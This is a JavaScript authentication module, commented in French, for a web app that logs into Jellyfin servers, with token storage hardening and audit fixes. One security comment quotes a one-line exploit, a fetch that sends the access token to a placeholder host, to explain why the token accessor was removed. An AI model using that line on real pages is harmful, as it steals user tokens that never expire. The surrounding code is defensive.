/**
 * SpaceHub — Jellyfin Authentication Manager
 * Version: 1.0.0
 *
 * Gère la connexion autonome à n'importe quel serveur Jellyfin.
 * Authentifie les utilisateurs via l'API REST (/Users/AuthenticateByName),
 * stocke le token d'accès et gère les sessions actives.
 */

'use strict';

import Logger from '../../core/Logger.js';

import * as svc from '../../core/services.js';
import { fetchAvecDelai } from '../../core/utils/reseau.js';
import { enteteAutorisation } from '../../core/utils/identiteClient.js';
const STORAGE_KEY = 'SpaceHub_jellyfin_auth';

/**
 * Clé des seules informations qu'on accepte de laisser en localStorage :
 * adresse du serveur et identité affichable. Aucun secret.
 */
const CLE_REPRISE = 'SpaceHub_derniere_session';

class AuthManager {
    constructor() {
        this._log = new Logger('AuthManager');
        this._authData = this._loadAuth();
    }

    /**
     * OÙ VIT LE JETON, ET POURQUOI CE N'EST PLUS localStorage.
     * =========================================================
     *
     * Le jeton d'accès Jellyfin était écrit dans `localStorage`. Trois faits
     * rendent ce choix intenable, et ils se combinent :
     *
     *   1. `localStorage` est lisible par TOUT script s'exécutant sur la page.
     *      L'OWASP est sans nuance là-dessus : « Do not store session
     *      identifiers in local storage as the data is always accessible by
     *      JavaScript ».
     *   2. Le jeton Jellyfin **n'expire pas**. Un jeton exfiltré une fois
     *      reste valable indéfiniment, jusqu'à révocation manuelle par
     *      l'administrateur — qui n'a aucune raison de la soupçonner.
     *   3. `localStorage` survit à la fermeture du navigateur. La fenêtre
     *      d'exposition n'est donc pas la session : c'est « pour toujours ».
     *
     * La bonne réponse serait un cookie `HttpOnly; Secure; SameSite`, que le
     * JavaScript ne peut pas lire du tout. Elle nous est fermée : le cookie
     * doit être posé par le serveur, et SpaceHub ne contrôle pas le serveur
     * Jellyfin de l'utilisateur.
     *
     * Le repli retenu tient en deux points :
     *
     *   • le jeton vit EN MÉMOIRE (`this._authData`) — c'est la source de
     *     vérité, et elle disparaît avec l'onglet ;
     *   • une copie va dans `sessionStorage`, uniquement pour que F5 ne
     *     déconnecte pas. `sessionStorage` est cloisonné à l'onglet et effacé
     *     à sa fermeture : l'exposition passe de « indéfinie » à « la durée
     *     de l'onglet ».
     *
     * CE QUE ÇA COÛTE, ET C'EST RÉEL : fermer le navigateur déconnecte. Sur
     * un téléviseur où l'on relance l'application chaque soir, c'est une
     * saisie de mot de passe de plus. L'atténuation est en dessous —
     * `_memoriserReprise()` garde l'adresse du serveur et le profil (jamais
     * le jeton) dans `localStorage`, de sorte que l'écran de connexion revient
     * pré-rempli sur le bon serveur avec le bon compte présélectionné : il ne
     * reste que le mot de passe à taper.
     *
     * @returns {Object|null}
     */
    _loadAuth() {
        try {
            const sessionRaw = sessionStorage.getItem(STORAGE_KEY);
            if (sessionRaw) return JSON.parse(sessionRaw);

            // MIGRATION — un jeton hérité de l'ancienne version traîne peut-être
            // encore dans localStorage. On ne se contente pas de l'ignorer :
            // l'ignorer le laisserait sur le disque de l'utilisateur, lisible,
            // pour toujours. On le déplace vers sessionStorage (la session en
            // cours n'est donc pas interrompue) et on EFFACE l'original.
            const heriteRaw = localStorage.getItem(STORAGE_KEY);
            if (heriteRaw) {
                localStorage.removeItem(STORAGE_KEY);
                const data = JSON.parse(heriteRaw);
                if (data?.AccessToken) {
                    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(data));
                    this._log.info('Jeton hérité déplacé de localStorage vers sessionStorage.');
                    return data;
                }
            }
            return null;
        } catch {
            return null;
        }
    }

    /**
     * Écrit — ou efface — l'état d'authentification.
     *
     * `this._authData` est la source de vérité ; `sessionStorage` n'est qu'un
     * filet pour survivre à un rechargement. Le jeton ne va JAMAIS dans
     * `localStorage` (voir le commentaire de `_loadAuth`).
     *
     * @param {Object|null} data
     */
    _saveAuth(data) {
        this._authData = data;
        try {
            if (data) {
                sessionStorage.setItem(STORAGE_KEY, JSON.stringify(data));
                this._memoriserReprise(data);
            } else {
                sessionStorage.removeItem(STORAGE_KEY);
                // Par prudence : si une version antérieure en a laissé une copie.
                localStorage.removeItem(STORAGE_KEY);
            }
        } catch (err) {
            // Navigation privée stricte, quota plein : la session reste
            // utilisable en mémoire, elle ne survivra simplement pas à F5.
            this._log.warn('Session non persistée (le rechargement déconnectera) :', err?.message || err);
        }
    }

    /**
     * Retient de quoi pré-remplir l'écran de connexion : l'adresse du serveur
     * et le profil utilisé. AUCUN SECRET — c'est la condition pour que ceci
     * ait le droit d'aller dans `localStorage`.
     *
     * C'est ce qui rend le compromis supportable : la déconnexion à la
     * fermeture du navigateur ne redemande que le mot de passe, pas l'adresse
     * du serveur ni le choix du compte.
     *
     * @param {Object} data
     */
    _memoriserReprise(data) {
        try {
            localStorage.setItem(CLE_REPRISE, JSON.stringify({
                ServerUrl: data?.ServerUrl || '',
                UserName: data?.User?.Name || '',
                UserId: data?.User?.Id || '',
            }));
        } catch { /* la mémorisation est un confort, jamais une dépendance */ }
    }

    /**
     * Relit ce que `_memoriserReprise` a gardé, pour l'écran de connexion.
     * @returns {{ ServerUrl: string, UserName: string, UserId: string }|null}
     */
    derniereSession() {
        try {
            const brut = localStorage.getItem(CLE_REPRISE);
            if (!brut) return null;
            const d = JSON.parse(brut);
            // Garde-fou : si une version future y écrivait un secret par
            // erreur, on refuse de le rendre plutôt que de le propager.
            if (d && (d.AccessToken || d.Pw || d.password)) {
                localStorage.removeItem(CLE_REPRISE);
                return null;
            }
            return d;
        } catch {
            return null;
        }
    }

    /**
     * Vérifie si l'utilisateur est authentifié.
     * @returns {boolean}
     */
    isAuthenticated() {
        return !!(this._authData?.AccessToken && this._authData?.ServerUrl && this._authData?.User?.Id);
    }

    getServerUrl() {
        return this._authData?.ServerUrl || '';
    }

    getToken() {
        return this._authData?.AccessToken || '';
    }

    getUserId() {
        return this._authData?.User?.Id || '';
    }

    getUser() {
        return this._authData?.User || null;
    }

    getDeviceId() {
        let id = localStorage.getItem('sh_device_id');
        if (!id) {
            id = 'sh_web_' + Math.random().toString(36).substring(2, 11);
            localStorage.setItem('sh_device_id', id);
        }
        return id;
    }

    /**
     * Génère les en-têtes d'autorisation Jellyfin officiels.
     * @returns {Record<string, string>}
     */
    getAuthHeaders() {
        const token = this.getToken();
        const deviceId = this.getDeviceId();
        const authHeader = enteteAutorisation(deviceId, token);

        return {
            'Accept': 'application/json',
            'Content-Type': 'application/json',
            'X-Emby-Authorization': authHeader,
            'Authorization': authHeader
        };
    }

    /**
     * Authentifie un utilisateur sur un serveur Jellyfin.
     * @param {string} serverUrl - URL du serveur (ex: http://localhost:8096)
     * @param {string} username
     * @param {string} password
     * @returns {Promise<{ success: boolean, user?: Object, error?: string }>}
     */
    /**
     * Normalise et VALIDE une adresse de serveur.
     *
     * AUDIT A11 — l'URL saisie n'était que « trimée ». Trois conséquences :
     *   • Une saisie sans schéma (« 192.168.1.20:8096 ») produisait une URL
     *     relative : `fetch('192.168.1.20:8096/Users/…')` partait sur
     *     l'origine de SpaceHub, échouait, et le code retombait en silence
     *     sur le proxy — l'utilisateur voyait « serveur injoignable » alors
     *     qu'il ne manquait que « http:// ».
     *   • Un schéma exotique (`javascript:`, `file:`, `data:`) était accepté
     *     tel quel et concaténé dans des URL utilisées ailleurs.
     *   • Une adresse invalide n'était détectée qu'au moment du réseau.
     *
     * @param {string} valeur
     * @returns {{ ok: boolean, url?: string, erreur?: string }}
     */
    _normaliserUrlServeur(valeur) {
        let brut = String(valeur ?? '').trim().replace(/\/+$/, '');
        if (!brut) return { ok: true, url: '' };   // vide = repli sur le proxy relatif

        // Schéma absent : on suppose http, comme le fait le client officiel.
        if (!/^[a-z][a-z0-9+.-]*:/i.test(brut)) brut = `http://${brut}`;

        let u;
        try {
            u = new URL(brut);
        } catch {
            return { ok: false, erreur: 'Adresse de serveur invalide. Exemple : http://192.168.1.20:8096' };
        }
        if (u.protocol !== 'http:' && u.protocol !== 'https:') {
            return { ok: false, erreur: `Le schéma « ${u.protocol} » n'est pas accepté. Utilisez http:// ou https://.` };
        }
        if (!u.hostname) {
            return { ok: false, erreur: 'Adresse de serveur incomplète : il manque le nom d\'hôte.' };
        }
        // `origin + pathname` conserve un éventuel sous-chemin (« /jellyfin »)
        // que beaucoup d'installations derrière un reverse-proxy utilisent.
        const chemin = u.pathname.replace(/\/+$/, '');
        return { ok: true, url: `${u.origin}${chemin}` };
    }

    async login(serverUrl, username, password) {
        const normalise = this._normaliserUrlServeur(serverUrl);
        if (!normalise.ok) {
            this._log.warn('URL de serveur refusée :', normalise.erreur);
            return { success: false, error: normalise.erreur };
        }
        const cleanUrl = normalise.url;
        const cleanUser = (username || '').trim();
        const cleanPass = password || '';
        const deviceId = this.getDeviceId();

        this._log.info(`Tentative de connexion à ${cleanUrl || '(local proxy)'} pour "${cleanUser}"...`);

        const authHeader = enteteAutorisation(deviceId);

        const doAuth = async (targetBase) => {
            const directUrl = `${targetBase}/Users/AuthenticateByName`;
            const url = targetBase
                ? directUrl
                : `/api-proxy?url=${encodeURIComponent(`${cleanUrl}/Users/AuthenticateByName`)}`;
            // Plafond explicite : sans lui, un serveur qui ne répond pas laissait
            // le bouton « Se connecter » tourner indéfiniment (audit B6).
            return await fetchAvecDelai(url, {
                method: 'POST',
                headers: {
                    'Accept': 'application/json',
                    'Content-Type': 'application/json',
                    'X-Emby-Authorization': authHeader,
                    'Authorization': authHeader
                },
                body: JSON.stringify({
                    Username: cleanUser,
                    Pw: cleanPass
                })
            });
        };

        try {
            let res = null;
            // 1. Essayer avec l'URL renseignée
            try {
                res = await doAuth(cleanUrl);
            } catch (networkErr) {
                this._log.warn('Tentative directe échouée, essai via proxy relatif...', networkErr);
                // 2. Si échec réseau direct, tenter via le proxy Vite relatif
                res = await doAuth('');
            }

            if (!res.ok) {
                const errText = await res.text().catch(() => '');
                this._log.warn(`Échec de connexion (${res.status}):`, errText);
                if (res.status === 401) {
                    return { success: false, error: 'Identifiants invalides (nom d\'utilisateur ou mot de passe incorrect).' };
                }
                return { success: false, error: `Erreur serveur Jellyfin (${res.status}) : ${errText || 'Connexion refusée'}` };
            }

            const data = await res.json();
            const resolvedUrl = cleanUrl || (window.location.origin);
            const authPayload = {
                ServerUrl: resolvedUrl,
                AccessToken: data.AccessToken,
                User: data.User,
                SessionInfo: data.SessionInfo
            };

            this._saveAuth(authPayload);

            // Mettre à jour l'ApiClient global de SpaceHub
            this._syncGlobalClient(resolvedUrl, data.AccessToken);

            this._log.info(`✅ Connecté avec succès en tant que ${data.User.Name} !`);
            return { success: true, user: data.User };
        } catch (err) {
            this._log.error('Erreur réseau de connexion finale:', err);
            return { success: false, error: 'Impossible de joindre le serveur Jellyfin. Vérifiez que Jellyfin est bien démarré sur http://localhost:8096.' };
        }
    }

    /**
     * Liste les comptes affichables sur l'écran de connexion.
     *
     * Jellyfin expose `/Users/Public` sans authentification : ce sont les
     * comptes que l'administrateur a choisi de rendre visibles. C'est ce qui
     * permet de proposer un choix de profil au lieu d'un champ texte vide —
     * l'audit relevait que l'application était mono-utilisateur en pratique.
     *
     * Un serveur qui masque ses utilisateurs renvoie une liste vide : l'écran
     * de connexion retombe alors sur la saisie du nom, sans erreur.
     *
     * @param {string} serverUrl
     * @returns {Promise<Array<{Id: string, Name: string, PrimaryImageTag?: string, HasPassword?: boolean}>>}
     */
    async getPublicUsers(serverUrl) {
        const normalise = this._normaliserUrlServeur(serverUrl);
        if (!normalise.ok || !normalise.url) return [];
        const base = normalise.url;
        const tenter = async (url) => {
            const res = await fetchAvecDelai(url, { headers: { Accept: 'application/json' } }, 8000);
            if (!res.ok) throw new Error(`HTTP ${res.status}`);
            return res.json();
        };
        try {
            return await tenter(`${base}/Users/Public`);
        } catch (direct) {
            try {
                // Même repli que la connexion : le proxy relatif du serveur de
                // développement, quand l'appel direct est bloqué par CORS.
                return await tenter(`/api-proxy?url=${encodeURIComponent(`${base}/Users/Public`)}`);
            } catch (viaProxy) {
                this._log.warn('Liste des comptes publics indisponible :', viaProxy?.message || direct?.message);
                return [];
            }
        }
    }

    /**
     * Déconnecte l'utilisateur et nettoie la session.
     *
     * Le rechargement de page est le comportement par défaut (déconnexion
     * volontaire : on repart d'un état vierge). Il doit pouvoir être coupé
     * pour la déconnexion SUBIE — jeton révoqué par l'administrateur — car
     * un `reload()` effacerait le message qui explique pourquoi on est
     * revenu à l'écran de connexion, et l'utilisateur se retrouverait
     * déconnecté sans un mot d'explication.
     *
     * @param {Object}  [options]
     * @param {boolean} [options.rechargement=true]
     */
    async logout({ rechargement = true, previenirServeur = true } = {}) {
        this._log.info('Déconnexion de l\'utilisateur...');

        // AUDIT A1 — la déconnexion était purement locale : on effaçait le
        // jeton du navigateur et c'est tout. Côté Jellyfin, la session restait
        // OUVERTE et le jeton VALIDE pour toujours (il n'expire pas). Un jeton
        // récupéré avant la « déconnexion » continuait donc de fonctionner, et
        // la session s'accumulait dans le tableau de bord administrateur.
        //
        // On prévient le serveur d'abord, jeton encore en main. L'échec n'est
        // pas bloquant — se déconnecter localement doit rester possible même
        // serveur éteint — mais il est journalisé, pas avalé.
        if (previenirServeur && this.isAuthenticated()) {
            const base = this.getServerUrl();
            const entetes = this.getAuthHeaders();
            // Plafond de 4 s : la déconnexion est une action que l'utilisateur
            // attend immédiate. Un serveur éteint ne doit pas la faire
            // patienter jusqu'au timeout réseau du navigateur.
            const minuteur = new AbortController();
            const arret = setTimeout(() => minuteur.abort(), 4000);
            try {
                await fetchAvecDelai(`${base}/Sessions/Logout`, {
                    method: 'POST', headers: entetes, signal: minuteur.signal
                });
                this._log.info('Session fermée côté serveur.');
            } catch (err) {
                this._log.warn('Session non fermée côté serveur (le jeton reste valide) :', err?.message || err);
            } finally {
                clearTimeout(arret);
            }
        }

        this._saveAuth(null);
        // La coque globale gardait l'URL et les en-têtes de la session close :
        // tout appel tardif serait reparti avec un jeton mort.
        try { delete window.ApiClient; } catch { /* coque absente : rien à faire */ }
        if (rechargement) window.location.reload();
    }

    _syncGlobalClient(serverUrl, token) {
        const cleanUrl = (serverUrl || '').replace(/\/$/, '');
        try {
            const jellyfinClient = svc.api()?.getClient('jellyfin');
            if (jellyfinClient) {
                jellyfinClient.setBaseUrl(cleanUrl);
                jellyfinClient.setApiKey(token);
                jellyfinClient.refreshAuth?.();
            }
        } catch {
            // Ignorer si pas encore enregistré
        }

        const self = this;
        // NOTE DE SÉCURITÉ — pourquoi `accessToken()` n'est plus là.
        //
        // Cette coque globale exposait `accessToken: () => token`. Combinée à
        // l'absence de Content-Security-Policy, elle transformait n'importe
        // quelle injection ponctuelle en compromission de compte : une seule
        // ligne — `fetch('//x/?t='+ApiClient.accessToken())` — suffisait à
        // exfiltrer le jeton, qui n'expire pas et survit à la « déconnexion ».
        //
        // Aucun appelant n'en avait besoin : le seul lecteur du dépôt
        // (`core/ApiClient.js`) demande d'abord `svc.auth().getToken()`, et le
        // reste de la coque n'utilise que `getAuthHeaders()` en interne. Les
        // méthodes conservées ci-dessous ne divulguent rien : elles construisent
        // des URL ou passent l'en-tête sans jamais le rendre lisible.
        window.ApiClient = {
            serverAddress: () => cleanUrl,
            getCurrentUserId: () => self.getUserId(),
            getCurrentUser: async () => self.getUser(),
            deviceId: () => self.getDeviceId(),
                        getUrl: (endpoint, query) => {
                const ep = endpoint ? (endpoint.startsWith('/') ? endpoint : `/${endpoint}`) : '';
                const q = query ? '?' + new URLSearchParams(query).toString() : '';
                return `${cleanUrl}${ep}${q}`;
            },
            getImageUrl: (itemId, opts = {}) => {
                const params = new URLSearchParams({
                    maxWidth: opts.maxWidth ?? 400,
                    maxHeight: opts.maxHeight ?? 600,
                    quality: opts.quality ?? 90
                });
                return `${cleanUrl}/Items/${itemId}/Images/Primary?${params}`;
            },
            getItems: async (userId, options = {}) => {
                const params = new URLSearchParams(options).toString();
                const r = await fetchAvecDelai(`${cleanUrl}/Users/${userId || self.getUserId()}/Items?${params}`, {
                    headers: self.getAuthHeaders()
                });
                return await r.json();
            },
            getJSON: async (url) => {
                const fullUrl = url.startsWith('http') ? url : (url.startsWith('/') ? `${cleanUrl}${url}` : `${cleanUrl}/${url}`);
                const r = await fetchAvecDelai(fullUrl, { headers: self.getAuthHeaders() });
                return await r.json();
            }
        };
    }

    /**
     * Initialise l'état au démarrage de l'app.
     */
    async init() {
        if (this.isAuthenticated()) {
            this._syncGlobalClient(this.getServerUrl(), this.getToken());
            // Vérification de validité : seule une réponse 401/403 (token réellement
            // révoqué) invalide la session persistante. Un timeout proxy, un 502/504
            // ou un serveur temporairement injoignable préserve la session.
            try {
                // Vérification de démarrage : elle ne doit jamais retarder le
                // premier rendu de plus de quelques secondes.
                const res = await fetchAvecDelai(`${this.getServerUrl()}/System/Info`, {
                    headers: this.getAuthHeaders()
                }, 8000);
                if (res.status === 401 || res.status === 403) {
                    this._log.warn('Token Jellyfin révoqué par le serveur — session effacée.');
                    this._saveAuth(null);
                    return false;
                }
                return true;
            } catch {
                return true; // En mode hors-ligne / erreur temporaire, préserver la session
            }
        }
        return false;
    }
}

export default AuthManager;
